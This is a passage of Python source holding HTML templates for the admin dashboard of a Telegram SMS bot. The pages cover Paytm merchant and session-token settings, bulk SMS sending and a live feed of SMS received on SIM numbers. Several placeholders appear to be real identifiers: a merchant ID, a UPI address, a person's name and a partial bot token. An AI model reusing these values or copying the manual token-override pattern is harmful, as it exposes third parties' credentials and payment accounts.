        <div id="sessionMsg" style="margin-top:14px;padding:10px 14px;border-radius:8px;display:none"></div>
      </div>
      <div class="card-action-bar">
        <span style="font-size:12px;color:#64748b">Auto-refreshes seamlessly on API calls</span>
        <div style="display:flex;gap:10px">
          <button type="button" class="btn btn-outline btn-sm" onclick="copyElementText('paytmAccessTokenText')"><i class="fas fa-copy"></i> Copy Token</button>
          <button type="button" class="btn btn-accent btn-sm" onclick="refreshPaytmSession(this)"><i class="fas fa-sync-alt"></i> Force Refresh Now</button>
        </div>
      </div>
    </div>

    <!-- 2. PAYTM MERCHANT CREDENTIALS FORM -->
    <div class="card">
      <div class="card-header"><h2><i class="fas fa-qrcode"></i> Paytm Merchant Credentials & UPI QR</h2></div>
      <form method="POST" action="/settings/save-paytm">
        <div class="card-body">
          <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px">
            <div class="form-group">
              <label>Merchant ID (MID) <span style="color:#ef4444">*</span></label>
              <input type="text" name="paytm_mid" class="input" value="{{ s.paytm_mid }}" placeholder="uSherH20708687937743" required>
            </div>
            <div class="form-group">
              <label>Paytm UPI VPA (QR Receiver Address) <span style="color:#ef4444">*</span></label>
              <input type="text" name="paytm_vpa" class="input" value="{{ s.paytm_vpa }}" placeholder="paytm.s2fqznb@pty" required>
            </div>
          </div>

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px">
            <div class="form-group">
              <label>Merchant Business Name</label>
              <input type="text" name="paytm_merchant_name" class="input" value="{{ s.paytm_merchant_name }}" placeholder="Durgesh Sharma">
            </div>
            <div class="form-group">
              <label>Order ID Prefix / Merchant Ref</label>
              <input type="text" name="paytm_merchant_id" class="input" value="{{ s.paytm_merchant_id }}" placeholder="uSherH20708687937743">
            </div>
          </div>

          <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px">
            <div class="form-group">
              <label>Auth UMP Header</label>
              <input type="text" name="paytm_auth_ump" class="input" value="{{ s.paytm_auth_ump }}" placeholder="umpapp-3754-36d-aqr-cn7">
            </div>
            <div class="form-group">
              <label>Paytm App Version</label>
              <input type="text" name="paytm_app_version" class="input" value="{{ s.paytm_app_version }}" placeholder="9.44.2">
            </div>
          </div>
        </div>
        <div class="card-action-bar">
          <span style="font-size:12px;color:#64748b">Updates merchant credentials in DB and session</span>
          <button type="submit" class="btn btn-accent"><i class="fas fa-save"></i> Save Paytm Merchant Config</button>
        </div>
      </form>
    </div>

    <!-- 3. PAYTM MANUAL TOKEN OVERRIDE FORM -->
    <div class="card">
      <div class="card-header"><h2><i class="fas fa-sliders-h"></i> Manual Session Token Override</h2></div>
      <form method="POST" action="/settings/save-paytm-token">
        <div class="card-body">
          <p style="font-size:12px;color:#64748b;margin-bottom:16px">Optionally override the OAuth access token or refresh token manually if re-authenticated externally.</p>
          <div class="form-group" style="margin-bottom:16px">
            <label>Access Token (Bearer)</label>
            <input type="text" name="manual_access_token" class="input" value="{{ paytm_sess.access_token }}" placeholder="07ayitq7...">
          </div>
          <div class="form-group">
            <label>Refresh Token (OAuth)</label>
            <input type="text" name="manual_refresh_token" class="input" value="{{ paytm_sess.refresh_token }}" placeholder="0e8upwnm...">
          </div>
        </div>
        <div class="card-action-bar">
          <span style="font-size:12px;color:#64748b">Directly overrides paytm_session.json</span>
          <button type="submit" class="btn btn-accent"><i class="fas fa-save"></i> Save Manual Tokens</button>
        </div>
      </form>
    </div>

  </div>
</div>

<!-- ========================================== -->
<!-- TAB 2: TELEGRAM BOT TOKEN & PROFILE        -->
<!-- ========================================== -->
<div id="tab-bot" class="tab-content">
  <div style="display:flex;flex-direction:column;gap:20px;max-width:880px">
    
    <!-- 1. BOT TOKEN & CONNECTION -->
    <div class="card">
      <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
        <h2><i class="fab fa-telegram"></i> Telegram Bot Connection & Token</h2>
        <span class="badge-status badge-active"><i class="fas fa-circle" style="font-size:8px"></i> Polling Active</span>
      </div>
      <form method="POST" action="/settings/save-token">
        <div class="card-body">
          <div class="form-group">
            <label>Active Telegram Bot Token <span style="color:#ef4444">*</span></label>
            <div style="display:flex;gap:10px;align-items:center">
              <input type="text" id="botTokenInput" name="bot_token" class="input" value="{{ bot_token }}" placeholder="8807682707:AAGZE7CiTxqkF..." style="font-family:monospace;font-weight:600" required>
              <button type="button" class="btn btn-outline btn-sm" onclick="copyElementText('botTokenInput')"><i class="fas fa-copy"></i> Copy</button>
            </div>
            <span style="font-size:12px;color:#64748b;margin-top:6px;display:block">Your official bot API token from @BotFather.</span>
          </div>
        </div>
        <div class="card-action-bar">
          <span style="font-size:12px;color:#64748b">Use Save & Restart to re-bind bot polling</span>
          <div style="display:flex;gap:10px">
            <button type="submit" class="btn btn-accent"><i class="fas fa-save"></i> Save Bot Token</button>
            <button type="button" class="btn btn-gold" onclick="if(confirm('Save token and reload bot polling instance?')) document.getElementById('restartForm').submit()"><i class="fas fa-redo"></i> Save & Restart Bot</button>
          </div>
        </div>
      </form>
    </div>

    <!-- 2. BOT IDENTITY & PROFILE INFO -->
    <div class="card">
      <div class="card-header"><h2><i class="fas fa-robot"></i> Telegram Bot Profile & Identity</h2></div>
      <div class="card-body">
        <p style="font-size:12px;color:#64748b;margin-bottom:18px">Click <b>"Save Profile to DB"</b> to persist or <b>"Apply to Telegram Live"</b> to push profile changes directly to Telegram servers.</p>
        
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:16px">
          <div class="form-group">
            <label>Bot Display Name</label>
            <input type="text" id="p_name" class="input" value="{{ s.bot_name }}" placeholder="Khaat SMS Bot" maxlength="128">
          </div>
          <div class="form-group">
            <label>Short Description (chat header)</label>
            <input type="text" id="p_short" class="input" value="{{ s.bot_short_description }}" placeholder="Fast & Reliable SMS Service" maxlength="120">
          </div>
        </div>

        <div class="form-group" style="margin-bottom:16px">
          <label>Full Description (bot profile screen)</label>
          <textarea id="p_desc" class="input" rows="3" placeholder="Full service details for your bot...">{{ s.bot_description }}</textarea>
        </div>

        <div class="form-group" style="margin-bottom:16px">
          <label>About Text (bot info box)</label>
          <input type="text" id="p_about" class="input" value="{{ s.bot_about }}" placeholder="About Khaat Bot..." maxlength="120">
        </div>

        <div class="form-group" style="margin-bottom:18px">
          <label>Profile Avatar Photo</label>
          <div style="display:flex;gap:10px;align-items:center">
            <input type="file" id="p_photo" accept="image/jpeg,image/png" style="font-size:13px">
            <button type="button" class="btn btn-outline btn-sm" onclick="applyPhoto()"><i class="fas fa-camera"></i> Upload Photo</button>
          </div>
          <span id="photoStatus" style="font-size:12px;color:#64748b;margin-top:6px;display:block"></span>
        </div>

        <div class="form-group">
          <label>Bot Commands List (format: <code>command|description</code> one per line)</label>
          <textarea id="p_commands" class="input" rows="4" placeholder="start|Main menu&#10;help|Help guide&#10;admin|Admin panel&#10;refresh|Refresh panels (admin)">{{ s.bot_commands }}</textarea>
        </div>
        
        <span id="profileStatus" style="display:block;margin-top:10px;font-size:13px;color:#64748b"></span>
      </div>
      <div class="card-action-bar">
        <span style="font-size:12px;color:#64748b">Configures how users see the bot in Telegram</span>
        <div style="display:flex;gap:10px">
          <button type="button" class="btn btn-gold" onclick="saveBotFields()"><i class="fas fa-save"></i> Save Profile to DB</button>
          <button type="button" class="btn btn-accent" onclick="applyBotProfile()"><i class="fas fa-check-circle"></i> Apply to Telegram Live</button>
        </div>
      </div>
    </div>

  </div>
</div>

<!-- ========================================== -->
<!-- TAB 3: SMS RATES & LIMITS                  -->
<!-- ========================================== -->
<div id="tab-pricing" class="tab-content">
  <div class="card" style="max-width:880px">
    <div class="card-header"><h2><i class="fas fa-tag"></i> SMS Pricing & Balance Limits</h2></div>
    <form method="POST" action="/settings/save-pricing">
      <div class="card-body">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px">
          <div class="form-group">
            <label>SMS Cost (₹ per SMS) <span style="color:#ef4444">*</span></label>
            <input type="number" name="sms_cost" class="input" value="{{ s.sms_cost }}" step="0.01" min="0" required>
            <span style="font-size:11px;color:#64748b;margin-top:4px;display:block">Amount deducted from user balance per SMS dispatched</span>
          </div>
          <div class="form-group">
            <label>Minimum Recharge Deposit (₹) <span style="color:#ef4444">*</span></label>
            <input type="number" name="min_deposit" class="input" value="{{ s.min_deposit }}" step="1" min="1" required>
            <span style="font-size:11px;color:#64748b;margin-top:4px;display:block">Minimum payment amount accepted via Paytm QR</span>
          </div>
        </div>
      </div>
      <div class="card-action-bar">
        <span style="font-size:12px;color:#64748b">Controls per-message billing rates</span>
        <button type="submit" class="btn btn-accent"><i class="fas fa-save"></i> Save SMS Rates</button>
      </div>
    </form>
  </div>
</div>

<!-- ========================================== -->
<!-- TAB 4: BONUSES & REFERRALS                 -->
<!-- ========================================== -->
<div id="tab-bonuses" class="tab-content">
  <div class="card" style="max-width:880px">
    <div class="card-header"><h2><i class="fas fa-gift"></i> New User & Referral Bonuses</h2></div>
    <form method="POST" action="/settings/save-bonuses">
      <div class="card-body">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px">
          <div class="form-group">
            <label>🎁 Signup Bonus (₹)</label>
            <input type="number" name="signup_bonus" class="input" value="{{ s.signup_bonus }}" step="0.5" min="0" required>
            <span style="font-size:11px;color:#64748b;margin-top:4px;display:block">Credited automatically to new users on first /start (0 = disabled)</span>
          </div>
          <div class="form-group">
            <label>👥 Referral Bonus per Invite (₹)</label>
            <input type="number" name="referral_bonus" class="input" value="{{ s.referral_bonus }}" step="0.5" min="0" required>
            <span style="font-size:11px;color:#64748b;margin-top:4px;display:block">Credited to referrer once a referred user registers</span>
          </div>
        </div>
      </div>
      <div class="card-action-bar">
        <span style="font-size:12px;color:#64748b">Incentivizes user growth and referrals</span>
        <button type="submit" class="btn btn-accent"><i class="fas fa-save"></i> Save Bonus Settings</button>
      </div>
    </form>
  </div>
</div>

<!-- ========================================== -->
<!-- TAB 5: NOTIFICATIONS & CHANNEL             -->
<!-- ========================================== -->
<div id="tab-alerts" class="tab-content">
  <div class="card" style="max-width:880px">
    <div class="card-header"><h2><i class="fas fa-bell"></i> Telegram Notifications & Promotion Links</h2></div>
    <form method="POST" action="/settings/save-alerts">
      <div class="card-body">
        <div class="form-group" style="margin-bottom:18px">
          <label>Admin Telegram Chat ID (for payment & system alerts)</label>
          <input type="text" name="telegram_chat_id" class="input" value="{{ s.telegram_chat_id }}" placeholder="-1001234567890">
          <span style="font-size:11px;color:#64748b;margin-top:4px;display:block">Receive instant Telegram notifications when users verify payments or report issues</span>
        </div>

        <div class="form-group" style="margin-bottom:18px">
          <label>Official Telegram Channel Link</label>
          <input type="url" name="channel_url" class="input" value="{{ s.channel_url }}" placeholder="https://t.me/TheLooterSociety">
          <span style="font-size:11px;color:#64748b;margin-top:4px;display:block">Channel button shown in bot menu</span>
        </div>

        <div class="form-group">
          <label>Bot Welcome Message (shown on /start)</label>
          <textarea name="welcome_message" class="input" rows="3">{{ s.welcome_message }}</textarea>
        </div>
      </div>
      <div class="card-action-bar">
        <span style="font-size:12px;color:#64748b">Updates real-time alert dispatching</span>
        <button type="submit" class="btn btn-accent"><i class="fas fa-save"></i> Save Notification Settings</button>
      </div>
    </form>
  </div>
</div>

<!-- ========================================== -->
<!-- TAB 6: ADMIN SECURITY                      -->
<!-- ========================================== -->
<div id="tab-security" class="tab-content">
  <div class="card" style="max-width:720px">
    <div class="card-header"><h2><i class="fas fa-lock"></i> Change Web Dashboard Password</h2></div>
    <form method="POST" action="/settings/change-password">
      <div class="card-body">
        {% with messages = get_flashed_messages(with_categories=true) %}
          {% for cat, msg in messages %}
            {% if cat == 'pw' %}
              {% set parts = msg.split('|') %}
              <div class="flash flash-{{ parts[1] if parts|length > 1 else 'info' }}" style="margin-bottom:16px">
                <i class="fas fa-{{ 'check-circle' if parts|length > 1 and parts[1]=='success' else 'exclamation-circle' }}"></i> {{ parts[2] if parts|length > 2 else msg }}
              </div>
            {% endif %}
          {% endfor %}
        {% endwith %}
        
        <div class="form-group" style="margin-bottom:18px">
          <label>Current Admin Password <span style="color:#ef4444">*</span></label>
          <input type="password" name="current_password" class="input" placeholder="Enter existing password" required>
        </div>
        <div class="form-group" style="margin-bottom:18px">
          <label>New Password (min 6 characters) <span style="color:#ef4444">*</span></label>
          <input type="password" name="new_password" class="input" placeholder="Enter new strong password" required minlength="6">
        </div>
        <div class="form-group">
          <label>Confirm New Password <span style="color:#ef4444">*</span></label>
          <input type="password" name="confirm_password" class="input" placeholder="Re-type new password" required>
        </div>
      </div>
      <div class="card-action-bar">
        <span style="font-size:12px;color:#64748b">Updates dashboard login hash</span>
        <button type="submit" class="btn btn-gold"><i class="fas fa-key"></i> Update Admin Password</button>
      </div>
    </form>
  </div>
</div>

<form id="restartForm" method="POST" action="/settings/save-and-restart" style="display:none">
  <input type="hidden" name="sms_cost" id="r_sms_cost" value="{{ s.sms_cost }}">
  <input type="hidden" name="bot_token" id="r_bot_token" value="{{ bot_token }}">
  <input type="hidden" name="paytm_mid" id="r_paytm_mid" value="{{ s.paytm_mid }}">
  <input type="hidden" name="paytm_key" id="r_paytm_key" value="{{ s.paytm_key }}">
  <input type="hidden" name="paytm_merchant_id" id="r_paytm_merchant_id" value="{{ s.paytm_merchant_id }}">
  <input type="hidden" name="telegram_chat_id" id="r_telegram_chat_id" value="{{ s.telegram_chat_id }}">
  <input type="hidden" name="welcome_message" id="r_welcome_message" value="{{ s.welcome_message }}">
  <input type="hidden" name="min_deposit" id="r_min_deposit" value="{{ s.min_deposit }}">
  <input type="hidden" name="channel_url" id="r_channel_url" value="{{ s.channel_url }}">
  <input type="hidden" name="bot_name" id="r_bot_name" value="{{ s.bot_name }}">
  <input type="hidden" name="bot_description" id="r_bot_description" value="{{ s.bot_description }}">
  <input type="hidden" name="bot_short_description" id="r_bot_short_description" value="{{ s.bot_short_description }}">
</form>

<script>
function switchTab(tabId, btn) {
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  btn.classList.add('active');
  var target = document.getElementById(tabId);
  if(target) target.classList.add('active');
  try { localStorage.setItem('khaat_settings_tab', tabId); } catch(e){}
}

(function initTab(){
  var saved = localStorage.getItem('khaat_settings_tab');
  if(saved) {
    var btn = document.querySelector('.tab-btn[onclick*="'+saved+'"]');
    if(btn) switchTab(saved, btn);
  }
})();

function copyElementText(elemId){
  var el = document.getElementById(elemId);
  if(!el) return;
  var text = el.value || el.innerText;
  navigator.clipboard.writeText(text).then(()=>{
    alert('Copied to clipboard!');
  }).catch(()=>{
    var t = document.createElement('textarea');
    t.value = text;
    document.body.appendChild(t);
    t.select();
    document.execCommand('copy');
    document.body.removeChild(t);
    alert('Copied to clipboard!');
  });
}

async function refreshPaytmSession(btn) {
  var orig = btn.innerHTML;
  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Refreshing...';
  btn.disabled = true;
  var msg = document.getElementById('sessionMsg');
  if(msg) { 
    msg.style.display = 'block'; 
    msg.style.background = 'rgba(56,189,248,0.1)';
    msg.style.border = '1px solid rgba(56,189,248,0.3)';
    msg.innerHTML = '<span style="color:#38bdf8"><i class="fas fa-spinner fa-spin"></i> Contacting Paytm OAuth SV1 API...</span>'; 
  }
  try {
    var r = await fetch('/api/sync-payments', { method: 'POST' });
    var d = await r.json();
    if(d.success) {
      if(msg) {
        msg.style.background = 'rgba(34,197,94,0.1)';
        msg.style.border = '1px solid rgba(34,197,94,0.3)';
        msg.innerHTML = '<span style="color:#22c55e"><i class="fas fa-check-circle"></i> ' + (d.message || 'Paytm Session token refreshed & synced successfully!') + '</span>';
      }
      var badge = document.getElementById('sessionStatusBadge');
      if(badge) { badge.className = 'badge-status badge-active'; badge.innerHTML = '<i class="fas fa-check-circle"></i> Live Connected'; }
      if(d.new_access_token) {
        var tb = document.getElementById('paytmAccessTokenText');
        if(tb) tb.innerText = d.new_access_token;
      }
    } else {
      if(msg) {
        msg.style.background = 'rgba(239,68,68,0.1)';
        msg.style.border = '1px solid rgba(239,68,68,0.3)';
        msg.innerHTML = '<span style="color:#ef4444"><i class="fas fa-exclamation-circle"></i> Error: ' + (d.error || 'Failed to refresh token') + '</span>';
      }
    }
  } catch(e) {
    if(msg) {
      msg.style.background = 'rgba(239,68,68,0.1)';
      msg.style.border = '1px solid rgba(239,68,68,0.3)';
      msg.innerHTML = '<span style="color:#ef4444"><i class="fas fa-exclamation-circle"></i> Network Error: ' + e.message + '</span>';
    }
  }
  btn.innerHTML = orig;
  btn.disabled = false;
}

async function saveBotFields(){
  var st=document.getElementById('profileStatus');
  st.innerHTML='<i class="fas fa-spinner fa-spin"></i> Saving to database...';st.style.color='#0ea5e9';
  var data={
    name:document.getElementById('p_name').value,
    short_description:document.getElementById('p_short').value,
    description:document.getElementById('p_desc').value,
    about:document.getElementById('p_about').value,
    commands:document.getElementById('p_commands').value
  };
  try{
    var r=await fetch('/api/bot/save-profile',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
    var res=await r.json();
    st.innerHTML=res.success?'<i class="fas fa-check"></i> Profile saved to database!':'<i class="fas fa-times"></i> Error: '+(res.error||'Failed');
    st.style.color=res.success?'#22c55e':'#ef4444';
  }catch(e){st.innerHTML='<i class="fas fa-times"></i> '+e.message;st.style.color='#ef4444';}
}

async function applyBotProfile(){
  var st=document.getElementById('profileStatus');
  st.innerHTML='<i class="fas fa-spinner fa-spin"></i> Applying to Telegram live...';st.style.color='#0ea5e9';
  await saveBotFields();
  try{
    var r=await fetch('/api/bot/apply-profile',{method:'POST'});
    var res=await r.json();
    if(res.success){
      st.innerHTML='<i class="fas fa-check-double"></i> Live on Telegram! ('+res.applied.join(', ')+')';
      st.style.color='#22c55e';
    }else{
      var errs=res.errors?Object.entries(res.errors).map(function(e){return e[0]+': '+e[1]}).join('; '):res.error;
      st.innerHTML='<i class="fas fa-exclamation-triangle"></i> Partial: '+errs;
      st.style.color='#f59e0b';
    }
  }catch(e){st.innerHTML='<i class="fas fa-times"></i> '+e.message;st.style.color='#ef4444';}
}

async function applyPhoto(){
  var f=document.getElementById('p_photo');
  var st=document.getElementById('photoStatus');
  if(!f.files||!f.files[0]){st.innerHTML='Select an image first';st.style.color='#f59e0b';return;}
  st.innerHTML='<i class="fas fa-spinner fa-spin"></i> Uploading photo...';st.style.color='#0ea5e9';
  var fd=new FormData();
  fd.append('photo',f.files[0]);
  try{
    var r=await fetch('/api/bot/set-photo',{method:'POST',body:fd});
    var res=await r.json();
    st.innerHTML=res.success?'<i class="fas fa-check"></i> Photo updated on Telegram!':'<i class="fas fa-times"></i> '+(res.error||'Failed');
    st.style.color=res.success?'#22c55e':'#ef4444';
  }catch(e){st.innerHTML='<i class="fas fa-times"></i> '+e.message;st.style.color='#ef4444';}
}
</script>
"""



SEND_SMS_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-paper-plane accent"></i> <span class="accent">Send</span> <span class="gold">SMS</span></h1>

  <span style="font-size:12px;color:#22c55e;font-weight:600"><i class="fas fa-circle" style="animation:pulse 1.5s infinite"></i> Live</span>

</div>

<style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}</style>



<div class="card" style="max-width:680px">

  <div class="card-header"><h2><i class="fas fa-paper-plane"></i> Send SMS to Number</h2></div>

  <div class="card-body">

    {% with messages = get_flashed_messages(with_categories=true) %}

      {% for cat, msg in messages %}

        <div class="flash flash-{{ cat }}"><i class="fas fa-{{ 'check-circle' if cat=='success' else 'exclamation-circle' }}"></i> {{ msg }}</div>

      {% endfor %}

    {% endwith %}

    <form method="POST" action="/send-sms" id="sendForm">

      <div class="form-group" style="margin-bottom:18px">

        <label>Target Phone Number</label>

        <input type="text" name="target" class="input" placeholder="919876543210" required>

      </div>

      <div class="form-group" style="margin-bottom:18px">

        <label>Message</label>

        <textarea name="message" class="input" rows="4" placeholder="Type your SMS message here..." required></textarea>

      </div>

      <button type="submit" class="btn btn-accent" style="width:100%" id="sendBtn"><i class="fas fa-paper-plane"></i> Send SMS</button>

    </form>

  </div>

</div>



<div class="card" style="max-width:680px;margin-top:20px">

  <div class="card-header"><h2><i class="fas fa-layer-group"></i> Bulk SMS</h2></div>

  <div class="card-body">

    <form method="POST" action="/send-sms-bulk">

      <div class="form-group" style="margin-bottom:18px">

        <label>Phone Numbers (one per line)</label>

        <textarea name="numbers" class="input" rows="5" placeholder="919876543210&#10;919876543211&#10;919876543212" required></textarea>

      </div>

      <div class="form-group" style="margin-bottom:18px">

        <label>Message</label>

        <textarea name="message" class="input" rows="3" placeholder="Type your SMS message here..." required></textarea>

      </div>

      <button type="submit" class="btn btn-gold" style="width:100%" onclick="this.innerHTML='<i class=\'fas fa-spinner fa-spin\'></i> Sending...';this.disabled=true"><i class="fas fa-paper-plane"></i> Send Bulk SMS</button>

    </form>

  </div>

</div>



<div class="card" style="max-width:680px;margin-top:20px">

  <div class="card-header"><h2><i class="fas fa-history"></i> Recent Sent SMS</h2> <span style="font-size:11px;color:#22c55e;font-weight:600">● LIVE</span></div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table>

      <thead><tr><th>Target</th><th>Panel</th><th>Status</th><th>Time</th></tr></thead>

      <tbody id="sendLogs">

        {% for log in recent_logs %}

        <tr>

          <td>{{ log.target }}</td>

          <td class="truncate">{{ log.panel[:30] if log.panel else '-' }}</td>

          <td><span class="badge badge-{{ 'green' if log.status == 'sent' else 'red' }}">{{ log.status }}</span></td>

          <td>{{ log.created_at[:16] if log.created_at else '-' }}</td>

        </tr>

        {% endfor %}

        {% if not recent_logs %}

        <tr><td colspan="4" style="text-align:center;color:#94a3b8;padding:28px">No SMS sent yet</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>

<script>

document.getElementById('sendForm').addEventListener('submit',function(){

  var b=document.getElementById('sendBtn');

  b.innerHTML='<i class=\"fas fa-spinner fa-spin\"></i> Sending...';b.disabled=true;

  setTimeout(function(){b.innerHTML='<i class=\"fas fa-paper-plane\"></i> Send SMS';b.disabled=false;},5000);

});

async function refreshSendLogs(){

  try{var r=await fetch('/api/live-logs');if(!r.ok)return;var d=await r.json();

  var tb=document.getElementById('sendLogs');if(!tb||d.length===0)return;

  var h='';d.forEach(function(l){var sc=l.status==='sent'?'green':'red';

  h+='<tr><td>'+escapeHtml(l.target)+'</td><td class="truncate">'+escapeHtml(l.panel)+'</td><td><span class="badge badge-'+sc+'">'+escapeHtml(l.status)+'</span></td><td>'+escapeHtml(l.created_at)+'</td></tr>';

  });tb.innerHTML=h;}catch(e){}

}

setInterval(refreshSendLogs,8000);

</script>

"""



RECEIVED_SMS_PAGE = """
<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">
  <h1 style="margin:0"><i class="fas fa-inbox accent"></i> <span class="accent">Received</span> <span class="gold">SMS</span></h1>
  <div style="display:flex;gap:12px;align-items:center">
    <span style="font-size:12px;color:#22c55e;font-weight:600"><i class="fas fa-circle" style="animation:pulse 1.5s infinite"></i> Live Feed</span>
    <span style="font-size:13px;color:#64748b;font-weight:500">{{ total }} incoming messages</span>
  </div>
</div>
<style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}</style>

<div class="card">
  <div class="card-header">
    <h2><i class="fas fa-inbox"></i> Incoming SMS Feed</h2>
    <form method="GET" action="/received-sms" style="display:flex;gap:8px;align-items:center">
      <div class="search-box" style="margin:0;width:280px">
        <i class="fas fa-search"></i>
        <input type="text" name="number" class="input" value="{{ filter_number }}" placeholder="Search Sender or Receiver...">
      </div>
      <button type="submit" class="btn btn-accent btn-sm"><i class="fas fa-filter"></i></button>
      {% if filter_number %}<a href="/received-sms" class="btn btn-outline btn-sm"><i class="fas fa-times"></i> Clear</a>{% endif %}
    </form>
  </div>
  <div class="card-body" style="overflow-x:auto;padding:0">
    <table>
      <thead>
        <tr>
          <th style="width:18%"><i class="fas fa-user"></i> From (Sender)</th>
          <th style="width:18%"><i class="fas fa-sim-card"></i> To (Receiver SIM)</th>
          <th><i class="fas fa-comment-dots"></i> Message</th>
          <th style="width:16%"><i class="fas fa-server"></i> Panel</th>
          <th style="width:16%"><i class="fas fa-clock"></i> Received At</th>
        </tr>
      </thead>
      <tbody id="rxSms">
        {% for sms in messages %}
        <tr>
          <td><strong style="color:#d4a853">{{ sms.from_number or sms.number or '-' }}</strong></td>
          <td><span style="font-weight:600;color:#38bdf8">{{ sms.to_number or '-' }}</span></td>
          <td style="max-width:340px;word-break:break-word">{{ sms.message if sms.message else '-' }}</td>
          <td class="truncate">{{ sms.panel[:30] if sms.panel else '-' }}</td>
          <td>{{ sms.received_at[:19] if sms.received_at else '-' }}</td>
        </tr>
        {% endfor %}
        {% if not messages %}
        <tr><td colspan="5" style="text-align:center;color:#94a3b8;padding:32px"><i class="fas fa-inbox" style="font-size:24px;margin-bottom:8px;display:block;opacity:0.4"></i>No incoming SMS yet. Real incoming messages from devices or webhook will appear here live.</td></tr>
        {% endif %}
      </tbody>
    </table>
  </div>
</div>

<div class="pagination">
  {% if page > 1 %}<a href="/received-sms?page={{ page-1 }}{% if filter_number %}&number={{ filter_number }}{% endif %}"><i class="fas fa-chevron-left"></i></a>{% else %}<span class="disabled"><i class="fas fa-chevron-left"></i></span>{% endif %}
  {% for p in range(1, total_pages+1) %}
    {% if p == page %}<span class="current">{{ p }}</span>{% elif p <= 3 or p > total_pages-3 or (p >= page-2 and p <= page+2) %}<a href="/received-sms?page={{ p }}{% if filter_number %}&number={{ filter_number }}{% endif %}">{{ p }}</a>{% elif p == 4 or p == total_pages-3 %}<span class="disabled">...</span>{% endif %}
  {% endfor %}
  {% if page < total_pages %}<a href="/received-sms?page={{ page+1 }}{% if filter_number %}&number={{ filter_number }}{% endif %}"><i class="fas fa-chevron-right"></i></a>{% else %}<span class="disabled"><i class="fas fa-chevron-right"></i></span>{% endif %}
</div>

<script>
function escapeHtml(t){if(!t)return'';return String(t).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#039;');}
async function refreshRx(){
  try{
    var r = await fetch('/api/live-received');
    if(!r.ok) return;
    var d = await r.json();
    var tb = document.getElementById('rxSms');
    if(!tb || d.length === 0) return;
    var h = '';
    d.forEach(function(l){
      h += '<tr>' +
           '<td><strong style="color:#d4a853">' + escapeHtml(l.from) + '</strong></td>' +
           '<td><span style="font-weight:600;color:#38bdf8">' + escapeHtml(l.to) + '</span></td>' +
           '<td style="max-width:340px;word-break:break-word">' + escapeHtml(l.message) + '</td>' +
           '<td class="truncate">' + escapeHtml(l.panel) + '</td>' +
           '<td>' + escapeHtml(l.received_at) + '</td>' +
           '</tr>';
    });
    tb.innerHTML = h;
  }catch(e){}
}
setInterval(refreshRx, 3500);
</script>
"""
LAYOUT = """<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">

<title>Xcaliber - {{ title }}</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

<style>

:root{

  --bg:#f0f4f8;--card:#ffffff;--accent:#0ea5e9;--accent2:#38bdf8;--gold:#d4a853;--gold2:#f0d78c;

  --text:#1e293b;--muted:#64748b;--border:#e2e8f0;--input:#f8fafc;--input-border:#cbd5e1;

  --red:#ef4444;--green:#22c55e;--blue:#3b82f6;--yellow:#eab308;--shadow:0 1px 3px rgba(0,0,0,0.08),0 4px 12px rgba(0,0,0,0.04);

  --shadow-lg:0 4px 20px rgba(0,0,0,0.08);--radius:14px;--radius-sm:10px;--radius-xs:8px;

}

*{margin:0;padding:0;box-sizing:border-box}

body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);display:flex;min-height:100vh}

.sidebar{width:260px;background:linear-gradient(180deg,#ffffff 0%,#f8fafc 100%);border-right:1px solid var(--border);padding:0;display:flex;flex-direction:column;position:fixed;height:100vh;overflow-y:auto;z-index:100}

.sidebar .brand{padding:28px 24px 24px;text-align:center;border-bottom:1px solid var(--border);background:linear-gradient(135deg,rgba(14,165,233,0.06),rgba(212,168,83,0.06))}

.sidebar .brand .logo{width:52px;height:52px;border-radius:16px;background:linear-gradient(135deg,var(--accent),var(--gold));display:inline-flex;align-items:center;justify-content:center;margin-bottom:12px;box-shadow:0 4px 16px rgba(14,165,233,0.3)}

.sidebar .brand .logo i{font-size:22px;color:#fff}

.sidebar .brand h3{font-size:18px;font-weight:800;background:linear-gradient(135deg,var(--accent),var(--gold));-webkit-background-clip:text;-webkit-text-fill-color:transparent}

.sidebar .brand p{font-size:11px;color:var(--muted);margin-top:2px;font-weight:500;letter-spacing:0.5px;text-transform:uppercase}

.sidebar nav{flex:1;padding:16px 12px}

.sidebar nav a{display:flex;align-items:center;gap:12px;padding:11px 16px;color:var(--muted);text-decoration:none;font-size:13.5px;font-weight:500;border-radius:var(--radius-sm);transition:all .2s;margin-bottom:2px}

.sidebar nav a:hover{color:var(--accent);background:rgba(14,165,233,0.06)}

.sidebar nav a.active{color:var(--accent);background:linear-gradient(135deg,rgba(14,165,233,0.1),rgba(212,168,83,0.08));font-weight:600;box-shadow:inset 0 0 0 1px rgba(14,165,233,0.15)}

.sidebar nav a i{width:20px;text-align:center;font-size:15px}

.sidebar .logout{padding:16px;border-top:1px solid var(--border)}

.sidebar .logout a{color:var(--red);text-decoration:none;font-size:13px;display:flex;align-items:center;gap:8px;padding:10px 16px;border-radius:var(--radius-sm);transition:all .2s;font-weight:500}

